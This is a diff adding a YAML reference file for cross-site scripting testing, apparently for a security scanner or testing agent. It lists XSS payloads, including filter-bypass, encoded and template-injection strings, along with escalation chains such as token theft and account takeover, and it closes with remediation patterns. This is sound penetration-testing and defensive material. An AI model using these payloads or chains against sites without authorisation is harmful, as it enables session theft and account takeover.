@@ -1,0 +1,120 @@
+---
+name: xss
+description: Cross-site scripting testing covering reflected, stored, DOM-based, and mutation XSS
+category: vulnerabilities
+version: "1.0"
+tags: ["xss", "client-side", "owasp-a03", "javascript"]
+applies_to: ["React", "Vue", "Angular", "jQuery", "Vanilla JS", "PHP", "Python", "Node.js", "Java", "Go"]
+severity: "MEDIUM"
+confidence_threshold: "MEDIUM"
+---
+attack_surface:
+  - "URL parameters reflected in HTML response"
+  - "Search results, error messages, user profiles"
+  - "Comments, reviews, forum posts (stored XSS)"
+  - "DOM sinks: innerHTML, outerHTML, document.write, eval"
+  - "JavaScript event handlers: onload, onerror, onclick"
+  - "Template engines with unsafe interpolation"
+  - "JSON endpoints reflected without proper Content-Type"
+  - "PostMessage handlers without origin validation"
+
+detection_channels:
+  - "Reflected: Payload appears in response unencoded"
+  - "Stored: Payload persists and executes on subsequent views"
+  - "DOM-based: Payload executes via client-side JS sinks"
+  - "Mutation XSS: Browser parser normalizes malformed payload"
+  - "XS-Leaks: Cross-origin information leakage via side-channels"
+  - "CSP bypass: Policy misconfiguration allows script execution"
+
+payload_primitives:
+  basic:
+    - "<script>alert('XSS')</script>"
+    - "<img src=x onerror=alert(1)>"
+    - "<svg onload=alert(1)>"
+    - "<body onload=alert(1)>"
+    - "<input autofocus onfocus=alert(1)>"
+    - "<details open ontoggle=alert(1)>"
+    - "<marquee onstart=alert(1)>"
+  event_handlers:
+    - "\" onmouseover=alert(1) \""
+    - "\" onfocus=alert(1) \""
+    - "\" onclick=alert(1) \""
+    - "' onmouseover=alert(1) '"
+    - "' onfocus=alert(1) '"
+  javascript_uris:
+    - "javascript:alert(1)"
+    - "javascript:alert('XSS')"
+    - "javascript:alert(document.cookie)"
+    - "JaVaScRiPt:alert(1)"
+    - "data:text/html,<script>alert(1)</script>"
+  encoded_variants:
+    - "%3Cscript%3Ealert(1)%3C/script%3E"
+    - "%3Cimg%20src=x%20onerror=alert(1)%3E"
+    - "%253Cscript%253Ealert(1)%253C/script%253E"
+    - "&#60;script&#62;alert(1)&#60;/script&#62;"
+    - "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"
+  html_entities:
+    - "<script>alert(1)</script>"
+    - "<img src=x onerror=alert(1)>"
+  filter_bypass:
+    - "<scri<script>pt>alert(1)</scri</script>pt>"
+    - "<scr<script>ipt>alert(1)</scr</script>ipt>"
+    - "<scr%00ipt>alert(1)</scr%00ipt>"
+    - "<img src=x onerror=alert(1)//"
+    - "<svg/onload=alert(1)//"
+    - "<img src=\"x\" onerror=\"alert(1)\">"
+    - "<IMG SRC=x ONERROR=alert(1)>"
+    - "<iMg SrC=x OnErRoR=alert(1)>"
+    - "<img/src=x/onerror=alert(1)>"
+  template_injection:
+    - "{{constructor.constructor('alert(1)')()}}"
+    - "${alert(1)}"
+    - "#{alert(1)}"
+    - "{{7*7}}"
+    - "<%= 7*7 %>"
+  dom_sinks:
+    - "location.hash payload via innerHTML"
+    - "document.write(location.search)"
+    - "eval(userInput)"
+    - "Function(userInput)()"
+    - "setTimeout(userInput, 0)"
+  postmessage:
+    - "window.postMessage({xss: '<img src=x onerror=alert(1)>'}, '*')"
+
+false_positive_validation:
+  - "Verify payload executes in victim's browser context (not just reflected)"
+  - "Check Content-Type: text/html (not application/json, text/plain)"
+  - "Confirm no CSP blocking (check CSP headers, nonce/hash)"
+  - "Test in multiple browsers (Chrome, Firefox, Safari)"
+  - "Verify payload not HTML-encoded in response"
+  - "Check for sanitization libraries (DOMPurify, sanitize-html)"
+
+chaining_guidance:
+  - "XSS + CSRF → Account takeover (bypass anti-CSRF tokens)"
+  - "XSS + OAuth → Token theft (steal authorization codes)"
+  - "XSS + WebSocket → Real-time data exfiltration"
+  - "Self-XSS + Clickjacking → Exploitable XSS"
+  - "XSS + Service Worker → Persistent XSS"
+  - "DOM XSS + Prototype Pollution → RCE in Node.js"
+
+remediation_patterns:
+  - "Context-aware output encoding (HTML, JS, CSS, URL, Attribute)"
+  - "Content Security Policy (CSP) with nonce/hash-based script allowlist"
+  - "Use safe sinks: textContent, innerText, setAttribute vs innerHTML"
+  - "Validate and sanitize all user input (DOMPurify for HTML)"
+  - "Set HttpOnly, Secure, SameSite flags on cookies"
+  - "Use framework auto-escaping (React JSX, Vue templates, Angular sanitization)"
+  - "Implement Trusted Types for DOM sinks"
+
+code_locations:
+  - "Search for innerHTML, outerHTML, document.write, insertAdjacentHTML"
+  - "Find eval(), new Function(), setTimeout(string), setInterval(string)"
+  - "Look for dangerouslySetInnerHTML (React), v-html (Vue), [innerHTML] (Angular)"
+  - "Check template engines: {{ }}, {{{ }}, <%= %>, #{ }"
+  - "Identify user input in URL/HTML/JS contexts without encoding"
+
+references:
+  - "https://owasp.org/www-project-top-ten/2017/A7_Cross-Site_Scripting"
+  - "https://portswigger.net/web-security/cross-site-scripting"
+  - "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection"
+  - "https://csp.withgoogle.com/docs/strict-csp.html"
